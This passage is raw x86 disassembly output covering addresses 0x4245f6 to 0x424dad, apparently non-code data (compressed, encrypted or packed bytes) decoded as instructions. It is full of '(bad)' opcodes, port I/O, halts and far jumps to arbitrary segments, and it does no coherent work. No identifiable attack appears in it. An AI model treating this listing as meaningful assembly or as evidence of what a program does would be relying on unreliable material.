  4245f6:	xchg   esi,eax
  4245f7:	lock mov DWORD PTR [eax-0x3b43bd9a],eax
  4245fe:	pop    esp
  4245ff:	rcl    DWORD PTR [ebx+0x3e936e64],1
  424605:	aaa    
  424606:	shr    DWORD PTR [esi+ebx*1+0x68],0xd6
  42460b:	sbb    DWORD PTR [eax+0x49],esi
  42460e:	cs in  eax,0x20
  424611:	(bad)  
  424612:	cmp    ah,BYTE PTR [edx+edx*2-0x73]
  424616:	sub    al,0x0
  424618:	pop    esp
  424619:	fdivrp st(4),st
  42461b:	mov    eax,ds:0xa3bc2477
  424620:	shl    DWORD PTR [edx+0x237d667],cl
  424626:	mov    bl,0xb
  424628:	(bad)  
  424629:	lds    ecx,FWORD PTR [esi]
  42462b:	pop    ebx
  42462c:	in     eax,dx
  42462d:	add    BYTE PTR [esi+0x6438323],ah
  424633:	pusha  
  424634:	jns    0x424612
  424636:	pusha  
  424637:	test   ecx,ecx
  424639:	aam    0xc2
  42463b:	cli    
  42463c:	cmc    
  42463d:	push   edx
  42463e:	jno    0x4245ec
  424640:	sti    
  424641:	adc    DWORD PTR [ebp-0x7383e83],ebx
  424647:	adc    DWORD PTR [eax-0x33f3d04],ecx
  42464d:	lods   ax,WORD PTR ds:[esi]
  42464f:	sub    ebx,DWORD PTR [ebx+0x5cc83bfc]
  424655:	inc    eax
  424656:	out    0xd4,al
  424658:	sub    DWORD PTR [ebx+0x371e3597],ebp
  42465e:	push   esp
  42465f:	sbb    dh,BYTE PTR [edx-0x7912e773]
  424665:	cmp    ah,BYTE PTR [edx-0xca105ce]
  42466b:	fcom   DWORD PTR [ecx]
  42466d:	adc    ah,ch
  42466f:	in     al,0x47
  424671:	push   edi
  424672:	out    dx,eax
  424673:	(bad)  
  424675:	inc    esi
  424676:	loopne 0x4246c7
  424678:	(bad)  
  424679:	mov    al,ds:0x109d7f63
  42467e:	js     0x4246d6
  424680:	or     eax,0x9e730333
  424685:	ret    0x5a36
  424688:	adc    eax,DWORD PTR [ecx-0xee05db5]
  42468e:	and    BYTE PTR [ecx+0x75abd45a],dh
  424694:	rol    DWORD PTR [ecx-0x30],cl
  424697:	jl     0x4246e8
  424699:	and    bl,BYTE PTR [edx+0x3b]
  42469c:	rcl    BYTE PTR [ebx-0x5cd2dddd],1
  4246a2:	mov    cl,0xcb
  4246a4:	push   ds
  4246a5:	mov    esp,0x542886a
  4246aa:	bound  edx,QWORD PTR [ebp+0x2b]
  4246ad:	sub    ebp,DWORD PTR [ecx]
  4246af:	fcmovnb st,st(6)
  4246b1:	fwait
  4246b2:	test   BYTE PTR [ecx+0x25c33f57],al
  4246b8:	xchg   esp,eax
  4246b9:	and    eax,0x3f94c4ac
  4246be:	jno    0x42468e
  4246c0:	retf   
  4246c1:	pushf  
  4246c2:	mov    ds:0x77cfbe5f,eax
  4246c7:	les    eax,FWORD PTR [ebp-0x34]
  4246ca:	sahf   
  4246cb:	mov    esi,0xe376891
  4246d0:	(bad)  ds:0xf0bc228d
  4246d6:	(bad)  
  4246d7:	push   0xffffff94
  4246d9:	jbe    0x4246cf
  4246db:	push   ebx
  4246dc:	dec    esp
  4246dd:	mov    esp,0x482adf1e
  4246e2:	rcr    BYTE PTR ds:0x2aa8ef93,1
  4246e8:	nop
  4246e9:	mov    eax,DWORD PTR [ebp+0x7d]
  4246ec:	pusha  
  4246ed:	jle    0x4246b9
  4246ef:	cdq    
  4246f0:	cdq    
  4246f1:	cmovne edx,DWORD PTR [bp+di-0x5402]
  4246f7:	sti    
  4246f8:	pop    edi
  4246f9:	mov    dh,0x29
  4246fb:	mov    bh,BYTE PTR [edi+0x2ee94d3a]
  424701:	jmp    0xb1ef0e90
  424706:	loopne 0x4246ce
  424708:	push   esi
  424709:	inc    eax
  42470a:	in     eax,0xfc
  42470c:	gs push ds
  42470e:	fldenv [ebp-0x66aa9843]
  424714:	hlt    
  424715:	xchg   esi,eax
  424716:	cmc    
  424717:	xchg   edi,eax
  424718:	mov    bl,0x33
  42471a:	aam    0x75
  42471c:	stos   BYTE PTR es:[edi],al
  42471d:	push   edi
  42471e:	mov    DWORD PTR [ebx-0x6337eb73],0x3e389d95
  424728:	aam    0x51
  42472a:	ja     0x4246b7
  42472c:	(bad)  
  42472e:	sbb    BYTE PTR [ebx],al
  424730:	lds    ebp,FWORD PTR [ebx+0x36]
  424733:	sub    ah,dh
  424735:	cmp    dh,BYTE PTR [esi]
  424737:	mov    BYTE PTR [ecx-0x47],al
  42473a:	sbb    BYTE PTR [ebx+ecx*2+0x16],al
  42473e:	test   DWORD PTR [ebp-0x68d5f8bc],ecx
  424744:	in     eax,dx
  424745:	hlt    
  424746:	out    0xdf,al
  424748:	outs   dx,DWORD PTR ds:[esi]
  424749:	dec    edi
  42474a:	add    BYTE PTR [ebp-0x294fbffb],bh
  424750:	lock mov ebp,ss
  424753:	adc    eax,0xec9b43b6
  424758:	(bad)  
  424759:	mov    ebx,0x271e9b01
  42475e:	xor    al,0x73
  424760:	mov    WORD PTR [edi-0x44],ds
  424763:	xor    cl,BYTE PTR [edx+ebp*1+0x7c]
  424767:	dec    esp
  424768:	cmp    ebp,esi
  42476a:	loopne 0x424777
  42476c:	dec    eax
  42476d:	js     0x42475c
  42476f:	inc    esi
  424770:	add    edi,DWORD PTR ds:0xfc4a8b64
  424776:	fisub  WORD PTR [esi-0x38]
  424779:	push   0x6b47367
  42477e:	xor    esp,DWORD PTR [eax-0x1d847d19]
  424784:	sub    DWORD PTR [edi+0x7d4e55d8],esp
  42478a:	adc    dh,BYTE PTR [esi+0x4999d65e]
  424790:	(bad)  
  424791:	aaa    
  424792:	pop    esp
  424793:	add    ah,BYTE PTR [ecx-0x55]
  424796:	fldenv ds:0x698b86fd
  42479c:	adc    al,0x1a
  42479e:	or     al,0xe1
  4247a0:	in     eax,0x6
  4247a2:	dec    edi
  4247a3:	daa    
  4247a4:	or     BYTE PTR [ebx-0x80],bh
  4247a7:	fwait
  4247a8:	or     eax,DWORD PTR [edx+0x24df8f6b]
  4247ae:	or     eax,0xedbe5d9b
  4247b3:	stc    
  4247b4:	cmc    
  4247b5:	mov    ds:0xf0dd77c0,al
  4247ba:	and    cl,BYTE PTR [esi]
  4247bc:	int3   
  4247bd:	not    DWORD PTR [esi+0x36]
  4247c0:	aaa    
  4247c1:	xchg   ebx,eax
  4247c2:	inc    esp
  4247c3:	loope  0x42483a
  4247c5:	jne    0x424843
  4247c7:	push   esi
  4247c8:	dec    eax
  4247c9:	sub    dh,BYTE PTR [eax-0x677df036]
  4247cf:	les    edx,FWORD PTR [esi-0x24aaf89d]
  4247d5:	or     BYTE PTR [ebx+0x1e],0xc7
  4247d9:	int    0x29
  4247db:	adc    esi,DWORD PTR [edx-0x29511b54]
  4247e1:	dec    eax
  4247e2:	ret    0xd586
  4247e5:	hlt    
  4247e6:	cs inc ebp
  4247e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247e9:	mov    ah,0xb3
  4247eb:	inc    ecx
  4247ec:	cmp    al,0xf4
  4247ee:	push   edi
  4247ef:	pop    edx
  4247f0:	jl     0x424798
  4247f2:	adc    DWORD PTR [esi+eiz*2-0x34],esi
  4247f6:	and    eax,0x600e6118
  4247fb:	pop    edx
  4247fc:	push   0x1787711c
  424801:	fmul   st(5),st
  424803:	in     eax,0xdd
  424805:	push   eax
  424806:	cmp    BYTE PTR [ebp-0x24ff0aa3],bh
  42480c:	xchg   esi,eax
  42480d:	pop    esp
  42480e:	(bad)  
  42480f:	add    BYTE PTR [edi-0x1d0df69b],al
  424815:	xor    cl,BYTE PTR [ecx+ebx*4]
  424818:	lods   eax,DWORD PTR ss:[esi]
  42481a:	sub    dl,BYTE PTR [edx]
  42481c:	pop    edi
  42481d:	lods   al,BYTE PTR ds:[esi]
  42481e:	int3   
  42481f:	cdq    
  424820:	ss xchg esi,eax
  424822:	pop    ebp
  424823:	mov    edi,0xa0d2d0ee
  424828:	xor    eax,0x58cd2639
  42482d:	xor    al,0x90
  42482f:	test   eax,0x15646fa9
  424834:	test   al,0x4e
  424836:	add    DWORD PTR [ebx-0x17],edx
  424839:	cmp    ah,cl
  42483b:	(bad)  
  42483c:	cmc    
  42483d:	pop    es
  42483e:	div    bh
  424840:	rcr    BYTE PTR [ecx+edx*2],1
  424843:	gs jns 0x4247e8
  424846:	ins    BYTE PTR es:[edi],dx
  424847:	xor    ebp,ebx
  424849:	cld    
  42484a:	pop    edx
  42484b:	in     al,0x55
  42484d:	pop    ss
  42484e:	arpl   sp,ax
  424850:	jg     0x424838
  424852:	sahf   
  424853:	lds    ebx,FWORD PTR [edi+edx*4-0x31]
  424857:	repnz sar BYTE PTR [ebx+0x3b],0x42
  42485c:	stos   BYTE PTR es:[edi],al
  42485d:	(bad)  
  42485e:	cmp    DWORD PTR [ebx-0x72],esp
  424861:	mov    esp,0x90e3868f
  424866:	sub    esp,DWORD PTR [esi+0x73]
  424869:	lods   al,BYTE PTR ds:[esi]
  42486a:	xor    ch,BYTE PTR [ecx+0x47]
  42486d:	and    DWORD PTR [edi-0x41224521],esi
  424873:	lods   al,BYTE PTR ds:[esi]
  424874:	fstp   DWORD PTR [eax]
  424876:	push   ds
  424877:	pop    ecx
  424878:	aad    0x89
  42487a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42487b:	icebp  
  42487c:	enter  0x1446,0x3e
  424880:	push   eax
  424881:	add    eax,DWORD PTR [ebx-0x37]
  424884:	add    eax,0xd0bde3d9
  424889:	mov    ecx,eax
  42488b:	stos   DWORD PTR es:[edi],eax
  42488c:	inc    ecx
  42488d:	pop    edx
  42488e:	mov    ah,cl
  424890:	pop    esi
  424891:	retf   0xbbe7
  424894:	xchg   edi,eax
  424895:	test   DWORD PTR [eax-0x17],ebx
  424898:	into   
  424899:	xchg   esi,eax
  42489a:	sbb    bh,dl
  42489c:	jne    0x424899
  42489e:	adc    eax,0x5fc921ae
  4248a3:	in     eax,dx
  4248a4:	jo     0x4248dc
  4248a6:	test   BYTE PTR [edi],ah
  4248a8:	push   es
  4248a9:	add    al,0x56
  4248ab:	cmp    ch,0x64
  4248ae:	outs   dx,DWORD PTR ds:[esi]
  4248af:	clc    
  4248b0:	pop    ds
  4248b1:	bnd jne 0x4248f8
  4248b4:	mov    ch,0x70
  4248b6:	sbb    dl,BYTE PTR ds:0xb1e806fd
  4248bc:	inc    esp
  4248bd:	mov    esp,0x49930d12
  4248c2:	xchg   eax,esp
  4248c4:	outs   dx,BYTE PTR ds:[esi]
  4248c5:	or     bl,BYTE PTR [eax+0x6c54517d]
  4248cb:	mul    DWORD PTR [eax-0x6d]
  4248ce:	mov    ds:0x7d36e52d,al
  4248d3:	xchg   BYTE PTR [eax+0x6c],ch
  4248d6:	outs   dx,BYTE PTR ds:[esi]
  4248d7:	xchg   ebp,eax
  4248d8:	jne    0x4248a2
  4248da:	mul    BYTE PTR ds:0xa4fa6815
  4248e0:	add    BYTE PTR [ecx-0x40],0x9
  4248e4:	in     eax,0x85
  4248e6:	mov    al,ds:0xae5a2e19
  4248eb:	std    
  4248ec:	mov    edi,0x8449f688
  4248f1:	sahf   
  4248f2:	mov    dl,0x79
  4248f4:	aad    0x58
  4248f6:	enter  0xfd18,0x27
  4248fa:	lods   eax,DWORD PTR ds:[esi]
  4248fb:	push   esp
  4248fc:	push   esi
  4248fd:	and    al,0xa9
  4248ff:	test   BYTE PTR [ebp-0x680c7cce],dl
  424905:	jno    0x424968
  424907:	xor    ah,BYTE PTR [ebx-0x33]
  42490a:	bnd jno 0x424901
  42490d:	test   al,0x25
  42490f:	inc    ecx
  424910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424911:	xchg   ecx,ecx
  424913:	mov    eax,ds:0xedb55a5b
  424918:	push   ecx
  424919:	imul   ecx,DWORD PTR [ebp+0x4fadd209],0xb11b6e77
  424923:	fucom  st(5)
  424925:	outs   dx,BYTE PTR ds:[esi]
  424926:	lock sbb ch,BYTE PTR [edi]
  424929:	cli    
  42492a:	js     0x42493b
  42492c:	imul   ebp,ecx,0x68d3d3b6
  424932:	lods   eax,DWORD PTR ds:[esi]
  424933:	out    0x28,eax
  424935:	jg     0x4248c8
  424937:	or     BYTE PTR [ebp-0x3d996aa3],bh
  42493d:	inc    esp
  42493e:	int3   
  42493f:	xchg   DWORD PTR [eax-0x11],eax
  424942:	aam    0xed
  424944:	push   0xfffffffe
  424946:	cmp    dh,dh
  424948:	stos   BYTE PTR es:[edi],al
  424949:	push   esi
  42494a:	mov    ch,0x3f
  42494c:	push   es
  42494d:	f2xm1  
  42494f:	pusha  
  424950:	or     al,0x7a
  424952:	mov    edi,ds
  424954:	jbe    0x4249ab
  424956:	mov    al,ds:0x173080de
  42495b:	js     0x424982
  42495d:	push   esp
  42495e:	sbb    bl,ah
  424960:	sbb    bh,al
  424962:	jle    0x42493f
  424964:	adc    BYTE PTR [ebx+0x4b],cl
  424967:	fwait
  424968:	push   ebx
  424969:	mov    al,ds:0xbfe64cea
  42496e:	ficomp DWORD PTR [edi-0x40]
  424971:	mov    edx,0x3e87f1f5
  424976:	add    eax,0x70b6533a
  42497b:	retf   
  42497c:	lods   al,BYTE PTR ds:[esi]
  42497d:	pop    esp
  42497e:	inc    ecx
  42497f:	shl    DWORD PTR [edi-0x31d95e5f],0x7e
  424986:	mov    dh,0x43
  424988:	ins    BYTE PTR es:[edi],dx
  424989:	adc    eax,0x148bba05
  42498e:	aaa    
  42498f:	jl     0x424969
  424991:	mov    al,ds:0x30e8600e
  424996:	call   0xd751:0xa1ab1e58
  42499d:	or     dl,BYTE PTR [ebx]
  42499f:	outs   dx,DWORD PTR ds:[esi]
  4249a0:	pusha  
  4249a1:	pop    DWORD PTR [esi]
  4249a3:	push   0x79
  4249a5:	cmc    
  4249a6:	cmp    al,0xf0
  4249a8:	mov    ds:0xb2f2f0eb,al
  4249ad:	cmp    al,0x1d
  4249af:	data16 sahf 
  4249b1:	sub    al,BYTE PTR [eax-0x4ea44d36]
  4249b7:	loope  0x4249da
  4249b9:	sub    bh,BYTE PTR [eax+0x4f0ef9ff]
  4249bf:	loop   0x4249a3
  4249c1:	xchg   ebx,eax
  4249c2:	sbb    ch,BYTE PTR [edx-0x4aa28d62]
  4249c8:	sbb    ch,BYTE PTR [ecx]
  4249ca:	leave  
  4249cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249cd:	(bad)  
  4249ce:	(bad)  
  4249cf:	jno    0x4249b5
  4249d1:	jo     0x424a3a
  4249d3:	xor    eax,0xf2636a75
  4249d8:	fwait
  4249d9:	push   eax
  4249da:	inc    ebx
  4249db:	or     al,0x94
  4249dd:	cs pop ds
  4249df:	in     al,dx
  4249e0:	ja     0x424a46
  4249e2:	pop    ecx
  4249e3:	jle    0x4249e3
  4249e5:	push   eax
  4249e6:	push   es
  4249e7:	sbb    DWORD PTR [edi-0x1a],0xade634f3
  4249ee:	es mov dh,bl
  4249f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249f2:	sub    al,0xa5
  4249f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249f6:	jb     0x4249c2
  4249f8:	xor    al,0x36
  4249fa:	mov    esi,0x926a369d
  4249ff:	sub    BYTE PTR [esi-0x5edc735f],dl
  424a05:	sub    al,0xd7
  424a07:	sbb    edi,DWORD PTR [ebp-0x7ea375bb]
  424a0d:	and    edx,DWORD PTR [esi-0x339d5fd2]
  424a13:	sbb    DWORD PTR [esi-0x484c15f6],edx
  424a19:	or     bh,bl
  424a1b:	or     eax,0x8da76438
  424a20:	iret   
  424a21:	dec    eax
  424a22:	aaa    
  424a23:	fs clc 
  424a25:	mov    esi,ebp
  424a27:	mov    al,ds:0x4e3b22d7
  424a2c:	repz sbb eax,0x2d46fe22
  424a32:	js     0x4249ce
  424a34:	les    esi,FWORD PTR [ebp-0xc27e7c8]
  424a3a:	add    ch,BYTE PTR [esp+esi*1]
  424a3d:	push   ebx
  424a3e:	xor    dl,bl
  424a40:	xchg   BYTE PTR [ebp-0x669e5896],dh
  424a46:	out    0x9a,eax
  424a48:	hlt    
  424a49:	loopne 0x424a9d
  424a4b:	outs   dx,DWORD PTR ds:[esi]
  424a4c:	jmp    0xc8f8f3dd
  424a51:	xor    al,0xe
  424a53:	out    0x5,eax
  424a55:	outs   dx,DWORD PTR ds:[esi]
  424a56:	scas   al,BYTE PTR es:[edi]
  424a57:	adc    ah,al
  424a59:	neg    BYTE PTR [esi+0x32]
  424a5c:	outs   dx,BYTE PTR ds:[esi]
  424a5d:	push   eax
  424a5e:	dec    ebx
  424a5f:	std    
  424a60:	call   0x195a:0xc3f9ed94
  424a67:	out    0xc3,eax
  424a69:	jae    0x424a14
  424a6b:	xor    al,0x9c
  424a6d:	mov    esp,0xf0b12720
  424a72:	outs   dx,DWORD PTR ds:[esi]
  424a73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a74:	mov    al,0x5c
  424a76:	push   edx
  424a77:	addr16 (bad) 
  424a79:	jle    0x424ada
  424a7b:	mov    ds:0x5bd3c228,eax
  424a80:	arpl   WORD PTR [edi+0x5],dx
  424a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a84:	inc    ebx
  424a85:	sbb    al,0x58
  424a87:	sub    BYTE PTR [edi+0x22beb34],dl
  424a8d:	(bad)  
  424a8e:	hlt    
  424a8f:	test   al,0xed
  424a91:	and    eax,0x70fcdd34
  424a96:	popa   
  424a97:	test   DWORD PTR [ebp-0x5832a7b8],ecx
  424a9d:	js     0x424a30
  424a9f:	cld    
  424aa0:	and    eax,0xfe43fb51
  424aa5:	xor    ah,BYTE PTR [esi+0x194a826c]
  424aab:	push   ebp
  424aac:	ja     0x424a8b
  424aae:	loopne 0x424b1d
  424ab0:	mov    ds:0xd1bb573c,eax
  424ab5:	(bad)  
  424ab7:	xor    BYTE PTR [esi],cl
  424ab9:	push   ecx
  424aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424abb:	mov    esp,ebx
  424abd:	mov    cl,0x52
  424abf:	adc    BYTE PTR [edx+0x31ac2d1e],ah
  424ac5:	ret    
  424ac6:	stos   DWORD PTR es:[edi],eax
  424ac7:	xor    DWORD PTR [ecx+ecx*8-0x69aa745e],edi
  424ace:	pop    ds
  424acf:	(bad)  
  424ad0:	adc    al,BYTE PTR [edx+0x57c76a2c]
  424ad6:	mov    ds:0x42f8756e,eax
  424adb:	adc    eax,ebp
  424add:	cld    
  424ade:	test   BYTE PTR [esi],ah
  424ae0:	fisubr WORD PTR [edx-0x4c]
  424ae3:	dec    esp
  424ae4:	lds    edx,FWORD PTR ds:0x35544ace
  424aea:	dec    edi
  424aeb:	xchg   edx,eax
  424aec:	mov    ebx,0xf202c0a0
  424af1:	mov    esp,0x3616a8db
  424af6:	fadd   DWORD PTR [eax]
  424af8:	das    
  424af9:	inc    edx
  424afa:	inc    esp
  424afb:	das    
  424afc:	std    
  424afd:	test   DWORD PTR [ecx+0x6d],ecx
  424b00:	push   DWORD PTR [esp+eax*2-0x7d]
  424b04:	les    esi,FWORD PTR [ebx-0x5396b8f7]
  424b0a:	mov    bl,0x32
  424b0c:	jno    0x424b0e
  424b0e:	fld    DWORD PTR [edx-0xf]
  424b11:	xchg   edi,eax
  424b12:	pop    ebx
  424b13:	popf   
  424b14:	lock mov cl,0xd5
  424b17:	mov    DWORD PTR [ecx+0x56],0x832cc8c3
  424b1e:	icebp  
  424b1f:	sbb    dx,WORD PTR [esi]
  424b22:	mov    ebx,0xdab68c45
  424b27:	fxam   
  424b29:	push   0xffffff9a
  424b2b:	push   0x84f75d88
  424b30:	hlt    
  424b31:	or     eax,0x2349ab28
  424b36:	cmp    eax,0x66df6316
  424b3b:	inc    ebx
  424b3c:	les    eax,FWORD PTR [esi]
  424b3e:	mov    ecx,DWORD PTR [esi+0xab942c5]
  424b44:	or     BYTE PTR [edi],al
  424b46:	fld    QWORD PTR [esi]
  424b48:	cs into 
  424b4a:	stc    
  424b4b:	xchg   BYTE PTR [edi-0x7f],bh
  424b4e:	sub    eax,0x195f2cc4
  424b53:	push   ss
  424b54:	push   es
  424b55:	inc    ecx
  424b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b57:	pop    ecx
  424b59:	imul   DWORD PTR ds:0xd09b61b8
  424b5f:	mov    dh,0x7a
  424b61:	sbb    al,0xae
  424b63:	mov    ch,0x5b
  424b65:	pop    es
  424b66:	adc    al,0xae
  424b68:	cld    
  424b69:	jnp    0x424b30
  424b6b:	adc    BYTE PTR [eax+0x78],bl
  424b6e:	loope  0x424bde
  424b70:	in     al,0xe9
  424b72:	test   DWORD PTR ds:0xcb2fb706,0xa9d2734f
  424b7c:	add    BYTE PTR [edi],dl
  424b7e:	lahf   
  424b7f:	arpl   ax,cx
  424b81:	add    BYTE PTR [ebp-0x1ce1f778],ch
  424b87:	pop    es
  424b88:	dec    eax
  424b89:	jae    0x424b43
  424b8b:	rol    esp,0xd2
  424b8e:	push   0x6d
  424b90:	and    al,0x5
  424b92:	shl    BYTE PTR [ecx-0x36],0x81
  424b96:	push   ecx
  424b97:	loop   0x424bb4
  424b99:	inc    ebp
  424b9a:	(bad)  
  424b9c:	xchg   edi,eax
  424b9d:	push   edx
  424b9e:	retf   
  424b9f:	cmc    
  424ba0:	push   ecx
  424ba1:	ja     0x424bd4
  424ba3:	jae    0x424bbd
  424ba5:	ss cmc 
  424ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ba8:	xor    al,0x7
  424baa:	mov    cl,0xd6
  424bac:	push   ds
  424bad:	add    esi,0x17f9c12f
  424bb3:	xlat   BYTE PTR ds:[ebx]
  424bb4:	sbb    ah,BYTE PTR [edi+0x2a]
  424bb7:	mov    ebx,0x9c5c331
  424bbc:	and    eax,0xab8dc9a5
  424bc1:	cmp    cl,ch
  424bc3:	xchg   DWORD PTR [eax+0x5bca48d3],esp
  424bc9:	pusha  
  424bca:	push   ss
  424bcb:	xchg   ecx,eax
  424bcc:	and    BYTE PTR [edx+eax*4-0x69],dl
  424bd0:	lea    ecx,[edx]
  424bd2:	loop   0x424c51
  424bd4:	xchg   bp,ax
  424bd6:	push   ecx
  424bd7:	adc    al,0xcd
  424bd9:	not    DWORD PTR [edi+0x1]
  424bdc:	or     BYTE PTR [eax+0x4d912e49],0x79
  424be3:	mov    al,0x65
  424be5:	inc    ecx
  424be6:	jmp    0x424b76
  424be8:	pop    ebx
  424be9:	mov    DWORD PTR [edx+edi*1+0xaeab6d7],0x42241da
  424bf4:	(bad)  
  424bf5:	adc    al,0xda
  424bf7:	out    dx,al
  424bf8:	div    DWORD PTR [eax+ebp*8-0x516c308e]
  424bff:	jnp    0x424ba1
  424c01:	inc    eax
  424c02:	xchg   esp,eax
  424c03:	adc    ebp,ebx
  424c05:	cld    
  424c06:	pop    esi
  424c07:	push   0xffffff8f
  424c09:	push   0xffffff9a
  424c0b:	jp     0x424bd5
  424c0d:	test   DWORD PTR [edx],edx
  424c0f:	or     al,0xc9
  424c11:	or     DWORD PTR [ebx],esp
  424c13:	mov    ?,WORD PTR [ebx]
  424c15:	sub    bl,BYTE PTR [ecx]
  424c17:	ja     0x424c7e
  424c19:	jno    0x424be1
  424c1b:	push   ecx
  424c1c:	enter  0x2f94,0xf1
  424c20:	gs int 0xb9
  424c23:	gs pusha 
  424c25:	aad    0xe9
  424c27:	cli    
  424c28:	loopne 0x424c36
  424c2a:	cmp    DWORD PTR [edx],esi
  424c2c:	fwait
  424c2d:	call   0xc0f1:0x41cfef31
  424c34:	pop    edx
  424c35:	not    DWORD PTR [eax+0x3ce8deb9]
  424c3b:	dec    ebx
  424c3c:	out    0xce,eax
  424c3e:	int    0x74
  424c40:	pop    es
  424c41:	shr    DWORD PTR [ebx*1-0x2aebd54c],1
  424c48:	cmp    DWORD PTR [eax-0x2d],esi
  424c4b:	xchg   ebx,eax
  424c4c:	jmp    0x7aad:0x331a5c5b
  424c53:	loope  0x424c01
  424c55:	in     al,0xeb
  424c57:	(bad)  
  424c58:	jne    0x424c1e
  424c5a:	cld    
  424c5b:	pusha  
  424c5c:	add    al,0x5c
  424c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c5f:	loop   0x424c46
  424c61:	pop    ebp
  424c62:	mov    edx,0xdbd2b17
  424c67:	pcmpeqw mm1,QWORD PTR [edi-0x5ca39585]
  424c6e:	jns    0x424cd5
  424c70:	bound  esi,QWORD PTR [eax+0x1]
  424c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c74:	mov    ch,BYTE PTR [ebx+eiz*8]
  424c77:	jbe    0x424c93
  424c79:	out    dx,eax
  424c7a:	(bad)  
  424c7b:	inc    ecx
  424c7c:	loop   0x424c14
  424c7e:	fdivr  QWORD PTR [edi]
  424c80:	jle    0x424cab
  424c82:	push   0x2bb7ed4e
  424c87:	jno    0x424caa
  424c89:	xchg   ebp,eax
  424c8a:	inc    eax
  424c8b:	gs test eax,0x5e39ecd3
  424c91:	(bad)  
  424c92:	pushf  
  424c93:	outs   dx,BYTE PTR ds:[esi]
  424c94:	ins    BYTE PTR es:[edi],dx
  424c95:	hlt    
  424c96:	fxch   st(6)
  424c98:	shl    DWORD PTR [esi+0x3b1efcf8],1
  424c9e:	fnstcw WORD PTR ds:0xdd2fddf1
  424ca4:	push   ss
  424ca5:	adc    al,0xfc
  424ca7:	and    al,0x26
  424ca9:	mov    ebx,0x3e407e06
  424cae:	into   
  424caf:	add    dh,BYTE PTR [esi+0x7e]
  424cb2:	jg     0x424cf5
  424cb4:	jp     0x424cd3
  424cb6:	pop    eax
  424cb7:	mov    esi,0xe1b029b3
  424cbc:	mov    esi,DWORD PTR [ebx]
  424cbe:	xchg   ecx,eax
  424cbf:	push   ecx
  424cc0:	and    eax,0xe94edd73
  424cc5:	sub    BYTE PTR [edx+0x2],ah
  424cc8:	std    
  424cc9:	stc    
  424cca:	sbb    eax,DWORD PTR [ebx+ecx*1+0x5e7b1959]
  424cd1:	jg     0x424ce9
  424cd3:	ja     0x424ca4
  424cd5:	mov    DWORD PTR [edx+0x651d0472],edi
  424cdb:	jns    0x424d17
  424cdd:	inc    ecx
  424cde:	sbb    eax,0xa5287e44
  424ce3:	mov    edi,0x19dc8863
  424ce8:	sar    DWORD PTR [eax-0x31eb3cb9],cl
  424cee:	or     bl,BYTE PTR ds:0xba297f59
  424cf4:	xor    al,0xe3
  424cf6:	test   DWORD PTR [ebx+0x63],0xde60a0a4
  424cfd:	jge    0x424c9d
  424cff:	push   ds
  424d00:	dec    ecx
  424d01:	sub    ch,al
  424d03:	jecxz  0x424cbc
  424d05:	jg     0x424d4c
  424d07:	push   edi
  424d08:	dec    ebp
  424d09:	push   ebx
  424d0a:	mov    dh,0xa2
  424d0c:	cmp    BYTE PTR ds:0x4aea5943,ah
  424d12:	sbb    eax,0xdfe7a3d7
  424d17:	dec    ebx
  424d18:	imul   ecx,DWORD PTR [eax+0x3d],0x27
  424d1c:	push   esp
  424d1d:	mov    ebx,0x7ef23817
  424d22:	mov    cs,edx
  424d24:	scas   eax,DWORD PTR es:[edi]
  424d25:	adc    dh,bh
  424d27:	cli    
  424d28:	or     al,0x6
  424d2a:	mov    ecx,DWORD PTR [ecx]
  424d2c:	xchg   ebx,eax
  424d2d:	pop    esi
  424d2e:	scas   eax,DWORD PTR es:[edi]
  424d2f:	js     0x424d42
  424d31:	addr16 cmp ch,0xec
  424d35:	aad    0xfe
  424d37:	fisttp DWORD PTR [edi]
  424d39:	js     0x424cc8
  424d3b:	and    BYTE PTR [edi-0xd558eba],ch
  424d41:	mov    ebx,0x6256f85d
  424d46:	hlt    
  424d47:	mov    al,ds:0xc3523742
  424d4c:	push   edi
  424d4d:	jle    0x424dbf
  424d4f:	dec    ebx
  424d50:	lahf   
  424d51:	pop    esp
  424d52:	mov    ebx,0x280de3d7
  424d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d58:	lahf   
  424d59:	push   eax
  424d5a:	int3   
  424d5b:	pop    esi
  424d5c:	ins    DWORD PTR es:[edi],dx
  424d5d:	adc    al,0xd
  424d5f:	adc    al,0xd2
  424d61:	xor    ebx,DWORD PTR [edi+0x2d]
  424d64:	and    DWORD PTR [ebp-0x39],ebx
  424d67:	inc    ecx
  424d68:	mov    ch,0xdb
  424d6a:	iret   
  424d6b:	loopne 0x424ddf
  424d6d:	xor    esp,DWORD PTR [edi+0x49]
  424d70:	cli    
  424d71:	mov    ebp,ecx
  424d73:	into   
  424d74:	jo     0x424d9b
  424d76:	lods   eax,DWORD PTR ds:[esi]
  424d77:	mov    bl,0xa3
  424d79:	mov    esp,0xad195e0d
  424d7e:	sbb    al,0xa8
  424d80:	stos   WORD PTR es:[edi],ax
  424d82:	mov    edx,0x5032626f
  424d87:	add    edi,ebx
  424d89:	sbb    eax,0xf98f0850
  424d8e:	lods   al,BYTE PTR ds:[esi]
  424d8f:	scas   eax,DWORD PTR es:[edi]
  424d90:	stc    
  424d91:	mov    edi,DWORD PTR ds:0x868f6069
  424d97:	jne    0x424dd0
  424d99:	cmc    
  424d9a:	add    bl,BYTE PTR [ebp+0x37]
  424d9d:	jno    0x424dda
  424d9f:	cdq    
  424da0:	jg     0x424dbe
  424da2:	jae    0x424d57
  424da4:	(bad)  
  424da5:	fidivr DWORD PTR [eax]
  424da7:	push   ss
  424da8:	pop    ss
  424da9:	enter  0xe1be,0x42
  424dad:	pop    ebp
